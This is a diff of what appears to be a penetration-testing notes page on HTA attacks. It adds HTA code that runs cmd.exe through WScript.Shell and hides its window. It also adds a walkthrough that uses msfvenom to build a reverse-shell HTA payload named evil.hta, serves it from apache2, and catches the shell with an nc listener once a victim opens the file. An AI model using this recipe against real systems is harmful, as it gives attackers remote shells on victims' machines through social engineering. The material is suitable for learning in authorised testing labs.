@@ -12,19 +12,69 @@ Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/prev
 
 ```html
 <html>
-
-<script>
-var c = 'cmd.exe'
-new ActiveXObject('WScript.Shell').Run(c);
-</script>
-
-<head></head>
-
+<head>
+</head>
 <body>
 <script>
-self.close();
+    var c = 'cmd.exe'
+    new ActiveXObject('WScript.Shell').Run(c);
+</script>
+<script>
+    self.close();
 </script>
 </body>
-
 </html>
 ```
+
+The ActiveXObjects provides access to operating system commands through Windows Script Host (WScript). The self.close() function hides the window. An alternative HTA code can be the following:
+
+```markup
+<html>
+<head>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>
+	self.close();
+</script>
+</body>
+</html>
+```
+
+### HTA Attack Scenario
+
+Create an msfvenom HTA payload using powershell:
+
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f
+hta-psh -o /var/www/html/evil.hta
+```
+
+Now randomized the string:
+
+```
+sudo cat /var/www/html/evil.hta
+```
+
+Parameters and Arguments:
+
+* \-nop: is shorthand for -NoProfile, which instructs PowerShell not to load the PowerShell user profile.
+* \-w hidden (shorthand for -WindowStyle hidden) to avoid creating a window on the user’s desktop.
+* \-e flag (shorthand for -EncodedCommand ) allows us to supply a Base64 encoded PowerShell script directly as a command line argument.
+
+Host your HTA application with apache2, python, or any other web service:
+
+```
+sudo systemctl start apache2
+```
+
+Set up a listener on your host:
+
+```
+nc -lnvp <YOUR_PORT>
+```
+
+Wait for the victim to navigate to your HTA application and allow the program to run. Once the program ran on the victim machine, you will receive a reverse shell.
